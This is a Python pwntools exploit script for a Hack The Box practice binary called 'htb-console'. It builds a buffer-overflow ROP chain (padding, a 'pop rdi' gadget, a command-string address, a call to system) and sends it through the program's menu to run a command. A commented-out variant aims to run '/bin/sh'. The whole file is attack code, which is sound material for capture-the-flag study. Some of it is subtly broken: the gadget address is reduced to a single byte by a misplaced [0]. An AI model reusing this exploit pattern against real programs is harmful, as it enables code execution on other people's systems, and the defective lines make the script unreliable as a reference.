
from pwn import *

#context.log_level = 'DEBUG'
context(os='linux', arch='amd64')

executable = '/home/kali/Downloads/htb-console'
padding_length = 24
command = 'date'

#################################################
# Create ROP Chain

elf = context.binary = ELF(executable)


rop = ROP(elf)

#rop.call(rop.find_gadget(['pop rdi', 'ret']))
#rop.call(0x402107)
rop.call(elf.symbols["system"])
info("%#x ROP", u64(rop.chain()))

#####################################################
# Create Payload

execute_string = p64(0x402107)
info("%#x Execute String Address", u64(execute_string))
POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret'])))[0]
info("%#x POP RDI", u64(POP_RDI))

payload = [
    b"A" * padding_length,
    POP_RDI,
    execute_string,
    rop.chain()
]

print(payload)

payload = b"".join(payload)

###################################################
# Run Process

io = elf.process()

log.info('add /bin/sh to memory')
io.sendlineafter('>>', 'hof')
io.sendlineafter('name: ', command)

log.info('Send Command flag')
io.sendlineafter('>>', 'flag')

log.info('Send Payload')
io.sendlineafter('flag: ', payload)

io.interactive()






#padding_length = 24
#system_address = p64(0x401381)
#execute_string = p64(0x402107)

#
#elf = context.binary = ELF(executable)
#
#log.info('Get Addresses')
#info("%#x run", elf.symbols.run)
#info("%#x winner", elf.symbols.winner)

#info("%#x system", elf.symbols.system)
#system_address = p64(elf.symbols.system)

#execute_string = next(elf.search(b'date'))
#info("%#x execute string", execute_string)
#execute_string = p64(next(elf.search(b'date')))#

#execute_string = p64(0x4040b0)

#call_system = next(elf.search(asm('call system'), executable = True)))[0]
#info("%#x execute string", execute_string)
#call_system = p64(call_system)

#rop = ROP(elf)
#POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
#info("%#x POP RDI", POP_RDI)
#POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
#
#log.info('Create IO')
##io = remote('', )
#io = process(executable)
#
#log.info('add /bin/sh to memory')
#io.sendlineafter('>>', 'hof')
#io.sendlineafter('name: ', '/bin/sh')
#
#log.info('Send Command flag')
#io.sendlineafter('>>', 'flag')
#
##payload = cyclic(200)
#
#
#padding = b'A' * padding_length
#payload = padding + POP_RDI + execute_string + system_address
#
#
#log.info('Send Payload')
#io.sendlineafter('flag: ', payload)     #flag
#
#
#io.interactive()
#
#